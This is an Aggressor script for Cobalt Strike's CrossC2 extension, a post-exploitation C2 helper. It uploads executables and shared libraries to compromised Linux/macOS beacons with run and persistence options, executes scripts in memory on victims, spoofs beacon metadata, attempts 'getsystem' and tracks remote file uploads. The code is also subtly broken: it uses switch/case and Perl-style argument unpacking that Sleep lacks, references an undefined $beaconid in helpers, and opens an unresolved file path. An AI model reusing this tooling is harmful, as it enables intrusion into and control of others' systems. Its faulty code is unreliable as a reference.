# Enhanced Cobalt Strike Aggressor Script for CrossC2 Interaction

# --- Utility Functions ---

# Generate a random string of specified length
# This function generates a random string of the specified length using alphanumeric characters.
sub random_string {
    local('$limit @random_str $characters $x $n');
    $limit = $1;
    @random_str = @();
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    for ($x = 0; $x < $limit; $x++) {
        $n = rand(strlen($characters));
        if ($n < 0 || $n >= strlen($characters)) {
            berror($beaconid, "Error: Invalid random index.");
            return "";
        }
        add(@random_str, charAt($characters, $n));
    }
    return join('', @random_str);
}

# Determine CrossC2 task type based on file extension
# This function determines the task type based on the file extension.
sub runType {
    local('$type');
    $type = lc($1);
    switch ($type) {
        case 'elf':
        case 'macho':
        case 'elf/macho':
            return '0';
        case 'so':
        case 'dylib':
        case 'so/dylib':
            return '1';
        default:
            berror($beaconid, "Error: Invalid task type.");
            return '-1';
    }
}

# Generate CrossC2 task information for dynamic loading
# This function generates task information for dynamic loading.
sub genTaskinfo_dyn {
    local('$taskType $taskAliasName $taskResType $taskNeedRun $taskNeedPersistence $taskXorKey $juicySize $transportArg $taskName');
    ($taskType, $taskAliasName, $taskResType, $taskNeedRun, $taskNeedPersistence, $taskXorKey, $juicySize, $transportArg) = @_;
    $taskNeedRun = $taskNeedRun ? 'Y' : 'N';
    $taskNeedPersistence = $taskNeedPersistence ? 'Y' : 'N';
    $taskName = random_string(8);
    if (!$taskName) {
        berror($beaconid, "Error: Failed to generate task name.");
        return "";
    }
    $taskResType = $taskResType eq 'no-info' ? '98765' : $taskResType;
    $taskinfo = "CrossC2@^$taskType^$taskNeedRun^$taskName^$taskAliasName^$taskResType^$juicySize^$transportArg";
    return $taskinfo;
}

# Generate CrossC2 task information for in-memory script execution
# This function generates task information for in-memory script execution.
sub genMemScriptInfo {
    local('$scriptType $scriptEngPath $taskResType $juicySize $transportArg $taskinfo');
    ($scriptType, $scriptEngPath, $taskResType, $juicySize, $transportArg) = @_;
    if (!$scriptType || !$scriptEngPath || !$taskResType || !$juicySize || !$transportArg) {
        berror($beaconid, "Error: Missing required parameters.");
        return "";
    }
    $taskinfo = "CC2-PyScript^$scriptType^$scriptEngPath^$taskResType^$juicySize^$transportArg";
    return $taskinfo;
}

# Construct header for injecting arguments into scripts
# This function constructs a header for injecting arguments into scripts.
sub scriptArgsHook {
    local('$scriptType @args $hook_header $index $value');
    ($scriptType, @args) = @_;
    $hook_header = '';
    switch ($scriptType) {
        case 'python':
            $hook_header = "import sys\nsys.argv=[";
            foreach $index => $value (@args) {
                $hook_header = "$hook_header'$value',";
            }
            $hook_header = "$hook_header]";
        case 'zsh':
            foreach $index => $value (@args) {
                $hook_header = "$hook_header$index=\"$value\"\n";
            }
        case 'bash':
            $hook_header = 'set -- ';
            foreach $index => $value (@args) {
                if ($index == 0) { continue; }
                $hook_header = "$hook_header\"$value\" ";
            }
    }
    return "$hook_header\n";
}

# Encode transport arguments using Base64
# This function encodes transport arguments using Base64.
sub transportArg {
    local('$arg $index $value');
    $arg = '';
    foreach $index => $value (@_) {
        if ($index) { $arg = "$arg^$value"; }
    }
    return base64_encode($arg);
}

# Encode transport arguments starting from a specific index
# This function encodes transport arguments starting from a specific index.
sub transportArgs {
    local('$afterIndex $arg $index $value');
    $afterIndex = int($1) - 1;
    $arg = '';
    foreach $index => $value ($2) {
        if ($index > $afterIndex) {
            $arg = $arg ? "$arg^$value" : $value;
        }
    }
    return base64_encode($arg);
}

# Create array of transport arguments starting from a specific index
# This function creates an array of transport arguments starting from a specific index.
sub transportArgsArray {
    local('$afterIndex @arg $index $value');
    $afterIndex = int($1) - 1;
    @arg = @();
    foreach $index => $value ($2) {
        if ($index > $afterIndex) { push(@arg, $value); }
    }
    return @arg;
}

# Concatenate strings from a specific index with spaces
# This function concatenates strings from a specific index with spaces.
sub transportStrings {
    local('$afterIndex $arg $flag $index $value');
    $afterIndex = int($1) - 1;
    $arg = '';
    $flag = 1;
    foreach $index => $value ($2) {
        if ($index > $afterIndex + 1) {
            $arg = $flag ? $value : "$arg $value";
            $flag = 0;
        }
    }
    return $arg;
}

# --- CrossC2 Interaction Functions ---

# Upload dynamic library/executable with detailed control
# This function uploads a dynamic library or executable with detailed control.
sub bcrossc2_load_dyn_pro {
    local('$beaconid $taskType $taskName $taskResType $taskNeedRun $taskNeedPersistence $taskXorKey $loadFileName $taskArgs $loadFilePath $juicySize $handle $juicyData $ELFName');
    ($beaconid, $taskType, $taskName, $taskResType, $taskNeedRun, $taskNeedPersistence, $taskXorKey, $loadFileName, $taskArgs) = @_;
    $loadFilePath = script_resource($loadFileName);
    $juicySize = lof($loadFilePath);
    if ($juicySize <= 0) { $loadFilePath = $loadFileName; }
    $handle = openf($loadFilePath);
    $juicyData = readb($handle, -1);
    closef($handle);
    $juicySize = lof($loadFilePath);
    $taskType = runType($taskType);
    if ($taskType eq '-1') { berror($beaconid, '[ CrossC2 ]: Invalid file type'); return; }
    $ELFName = genTaskinfo_dyn($taskType, $taskName, $taskResType, $taskNeedRun, $taskNeedPersistence, $taskXorKey, $juicySize, $taskArgs);
    bupload_raw!($beaconid, $ELFName, $juicyData);
}

# Upload dynamic library/executable with simplified parameters
# This function uploads a dynamic library or executable with simplified parameters.
sub bcrossc2_load_dyn {
    local('$beaconid $taskType $taskName $taskResType $loadFileName $taskArgs $loadFilePath $juicySize $handle $juicyData $taskTypeNum $ELFName');
    ($beaconid, $taskType, $taskName, $taskResType, $loadFileName, $taskArgs) = @_;
    $taskArgs = base64_encode($taskArgs);
    $loadFilePath = script_resource($loadFileName);
    $juicySize = lof($loadFilePath);
    if ($juicySize <= 0) { $loadFilePath = $loadFileName; }
    $handle = openf($loadFilePath);
    $juicyData = readb($handle, -1);
    closef($handle);
    $juicySize = lof($loadFilePath);
    $taskTypeNum = runType($taskType);
    if ($taskTypeNum eq '-1') { berror($beaconid, '[ CrossC2 ]: Invalid file type'); return; }
    $ELFName = genTaskinfo_dyn($taskTypeNum, $taskName, $taskResType, 'Y', 'N', '2', $juicySize, $taskArgs);
    bupload_raw!($beaconid, $ELFName, $juicyData);
}

# Execute script in memory on CrossC2 server
# This function executes a script in memory on the CrossC2 server.
sub brun_script_in_mem {
    local('$beaconid $scriptType $scriptEngPath $taskResType $loadFileName @taskArgs $loadFilePath $juicySize $handle $juicyData $scriptName $header');
    ($beaconid, $scriptType, $scriptEngPath, $taskResType, $loadFileName, @taskArgs) = @_;
    $loadFilePath = script_resource($loadFileName);
    $juicySize = lof($loadFilePath);
    if ($juicySize <= 0) { $loadFilePath = $loadFileName; }
    $handle = openf($loadFileName);
    $juicyData = readb($handle, -1);
    closef($handle);
    $juicySize = lof($loadFileName);
    $scriptName = genMemScriptInfo($scriptType, $scriptEngPath, $taskResType, $juicySize, '');
    $header = scriptArgsHook($scriptType, @taskArgs);
    bupload_raw!($beaconid, $scriptName, "$header$juicyData");
}

# Handle in-memory script execution with various options
# This function handles in-memory script execution with various options.
sub CrossC2MemScriptEng {
    local('$scriptType $taskResType $beaconid $scriptEnginePath $contentType $scriptLocalPath $transportArg $juicySize $data $out @args $pathIndex $filename');
    ($scriptType, $taskResType, $beaconid, $contentType, $scriptLocalPath, $transportArg) = @_;
    $scriptEnginePath = 'null';
    $juicySize = lof($scriptLocalPath);
    if ($juicySize == 0) {
        $scriptLocalPath = "cc2_$scriptType" . "_" . random_string(6);
        $transportArg = 'null';
        $data = transportStrings(1, $3);
        $out = openf(">$scriptLocalPath");
        writeb($out, $data);
        closef($out);
        brun_script_in_mem($beaconid, $scriptType, $scriptEnginePath, $taskResType, $scriptLocalPath, @());
        deleteFile($scriptLocalPath);
    } else {
        @args = transportArgsArray(2, $3);
        $pathIndex = lindexOf($scriptLocalPath, '/');
        $pathIndex += 1;
        $filename = substr($scriptLocalPath, $pathIndex);
        add(@args, $filename);
        brun_script_in_mem($beaconid, $scriptType, $scriptEnginePath, $taskResType, $scriptLocalPath, @args);
    }
}

# --- Beacon Metadata Functions ---

# Set metadata key-value pairs for a beacon
# This function sets metadata key-value pairs for a beacon.
sub bset_metadata {
    local('$bid $metadata_key $metadata_value');
    ($bid, $metadata_key, $metadata_value) = @_;
    binput($bid, "$metadata_key $metadata_value");
    bshell($bid, "$metadata_key $metadata_value");
}

# Set OS type metadata
# This function sets the OS type metadata.
sub bsetostype {
    local('$bid $ostype');
    ($bid, $ostype) = @_;
    bset_metadata($bid, 'setostype', $ostype);
}

# Set local IP metadata
# This function sets the local IP metadata.
sub bsetlocalip {
    local('$bid $localip');
    ($bid, $localip) = @_;
    bset_metadata($bid, 'setlocalip', $localip);
}

# Set hostname metadata
# This function sets the hostname metadata.
sub bsethostname {
    local('$bid $hostname');
    ($bid, $hostname) = @_;
    bset_metadata($bid, 'sethostname', $hostname);
}

# --- Beacon Command Functions ---

# Set environment variable on beacon
# This function sets an environment variable on the beacon.
sub bcc2_setenv {
    if ($1 && $2 && $3) {
        binput($1, "shell setenv $2 $3");
        bshell($1, "setenv $2 $3");
    } else {
        berror($1, '*[error]: setenv env_name env_value');
    }
}

# Unset environment variable on beacon
# This function unsets an environment variable on the beacon.
sub bcc2_unsetenv {
    if ($1 && $2) {
        binput($1, "shell unsetenv $2");
        bshell($1, "unsetenv $2");
    } else {
        berror($1, '*[error]: unsetenv env_name');
    }
}

# Spawn new session on beacon
# This function spawns a new session on the beacon.
sub bcc2_spawn {
    binput($1, 'shell spawn');
    bshell($1, 'spawn');
}

# Attempt to gain SYSTEM privileges on beacon
# This function attempts to gain SYSTEM privileges on the beacon.
sub bcc2_getsystem {
    binput($1, 'shell getsystem');
    bshell($1, 'getsystem');
}

# --- File Upload and Management Functions ---

@fileupload_list = @();
global(@fileupload_list);

# Upload file to beacon and track progress with callback
# This function uploads a file to the beacon and tracks progress with a callback.
sub bawait_upload {
    local('$bid $file_lpath $file_rpath $file_rname $file_data $file_size $cb $cb_args $handle $file_list_count');
    ($bid, $file_lpath, $file_rpath, $file_rname, $cb, $cb_args) = @_;
    $handle = openf($file_lpath);
    $file_data = readb($handle, -1);
    closef($handle);
    $file_size = lof($file_lpath);
    btask($bid, "upload file $file_lpath to $file_rpath$file_rname");
    $file_list_count = size(@fileupload_list);
    add(@fileupload_list, @($bid, $file_lpath, $file_rpath, $file_rname, $file_size, $cb, $cb_args, 'false', 'false'));
    bupload_raw!($bid, "$file_rpath/$file_rname", $file_data);
}

# Upload raw data as file to beacon and track progress with callback
# This function uploads raw data as a file to the beacon and tracks progress with a callback.
sub bawait_upload_raw {
    local('$bid $file_data $file_rpath $file_rname $cb $cb_args $file_size $file_lpath $file_list_count');
    ($bid, $file_data, $file_rpath, $file_rname, $cb, $cb_args) = @_;
    $file_size = strlen($file_data);
    $file_lpath = random_string(10);
    btask($bid, "upload rawData file-[$file_lpath] to $file_rpath$file_rname");
    $file_list_count = size(@fileupload_list);
    add(@fileupload_list, @($bid, $file_lpath, $file_rpath, $file_rname, $file_size, $cb, $cb_args, 'false', 'false'));
    bupload_raw!($bid, "$file_rpath/$file_rname", $file_data);
}

# Check file size on beacon to determine upload completion
# This function checks the file size on the beacon to determine upload completion.
sub bcheck_file_size {
    local('$bid $file_path $file_name $file_size');
    ($bid, $file_path, $file_name, $file_size) = @_;
    bls($bid, $file_path, lambda({
        local('@lines @subl $type $s $lastmod $name $realsize $f_key $f_value $f_rname');
        @lines = split('\n', @("$3" trim));
        @subl = sublist(@lines, 1);
        foreach $temp (@subl) {
            ($type, $s, $lastmod, $name) = split('\t', $temp);
            if ($name eq $file_name) {
                $realsize = long($s);
                if ($realsize >= $file_size) {
                    foreach $f_key => $f_value (@fileupload_list) {
                        $f_rname = $f_value[3];
                        if ($name eq $f_rname) {
                            @fileupload_list[$f_key][7] = 'true';
                            break;
                        }
                    }
                }
                break;
            }
        }
    }, $file_name => $file_name, $file_size => $file_size));
}

# Periodically check file upload status and execute callbacks
# This function periodically checks the file upload status and executes callbacks.
on heartbeat_1s {
    local('$f_key $f_value $f_bid $f_lpath $f_rpath $f_rname $f_size $f_cb $f_cb_args $f_match_size $f_cb_runed');
    if (@fileupload_list) {
        foreach $f_key => $f_value (@fileupload_list) {
            ($f_bid, $f_lpath, $f_rpath, $f_rname, $f_size, $f_cb, $f_cb_args, $f_match_size, $f_cb_runed) = @$f_value;
            if ($f_match_size eq 'false') {
                bcheck_file_size($f_bid, $f_rpath, $f_rname, $f_size);
            }
            if ($f_match_size eq 'true' && $f_cb_runed eq 'false') {
                @fileupload_list[$f_key][8] = 'true';
		[$f_cb: $f_bid, $f_cb_args];
                break;
            }
        }
        foreach $f_key => $f_value (@fileupload_list) {
            if ($f_value[7] eq 'true') {
                removeAt(@fileupload_list, int($f_key));
                break;
            }
        }
    }
}

# List files currently being uploaded
# This function lists files currently being uploaded.
ssh_alias list_uploadingFile {
    local('$bid $f_key $f_value $f_lpath');
    println(@fileupload_list);
    $bid = $1;
    if (@fileupload_list) {
        foreach $f_key => $f_value (@fileupload_list) {
            $f_lpath = $f_value[1];
            blog($bid, $f_lpath);
        }
    }
}

# --- CrossC2 Information Functions ---

# Retrieve information about CrossC2 sites
# This function retrieves information about CrossC2 sites.
sub getCrossC2Site {
    local('%beacon_site $beacon_count $Description $Proto $Host $Port $URI $beaconURL');
    %beacon_site = %();
    $beacon_count = 0;
    foreach $site_list (sites()) {
        ($Description, $Proto, $Host, $Port, $URI) = values($site_list, @('Description', 'Proto', 'Host', 'Port', 'URI'));
        if ("CrossC2" isin $Description) {
            $beaconURL = "$Proto$Host:$Port$URI";
            %beacon_site[$beacon_count] = @($Description, $beaconURL);
            $beacon_count += 1;
        }
    }
    return %beacon_site;
}

# Retrieve information about CrossC2 listeners
# This function retrieves information about CrossC2 listeners.
sub getCrossC2Listener {
    local('%beacon_listener $beacon_count $listener');
    %beacon_listener = %();
    $beacon_count = 0;
    foreach $listener (listeners_local()) {
        if ("CrossC2" isin $listener) {
            %beacon_listener[$beacon_count] = @($listener);
            $beacon_count += 1;
        }
    }
    return %beacon_listener;
}

# Retrieve active SSH sessions
# This function retrieves active SSH sessions.
sub getSSHSession {
    local('%sessionMap $sessionCount $beacon $internal $computer $tempMenuBar');
    %sessionMap = %();
    $sessionCount = 0;
    foreach $beacon (beacons()) {
        ($internal, $computer) = values($beacon, @('internal', 'computer'));
        $tempMenuBar = "$internal@$computer";
        if (-isactive($beacon['id']) && -isssh($beacon['id'])) {
            %sessionMap[$sessionCount] = @($tempMenuBar);
            $sessionCount += 1;
        }
    }
    return %sessionMap;
}

# Retrieve beacon data associated with a CrossC2 listener
# This function retrieves beacon data associated with a CrossC2 listener.
sub getCrossC2Beacon {
    local('$listener $type $beaconData');
    ($listener, $type) = @_;
    $beaconData = $null;
    if ($listener && $type) {
        switch ($type) {
            case 'lib': $beaconData = listener_info($listener)['CrossC2libBeacon'];
            case 'main': $beaconData = listener_info($listener)['CrossC2Beacon'];
        }
    }
    return $beaconData;
}
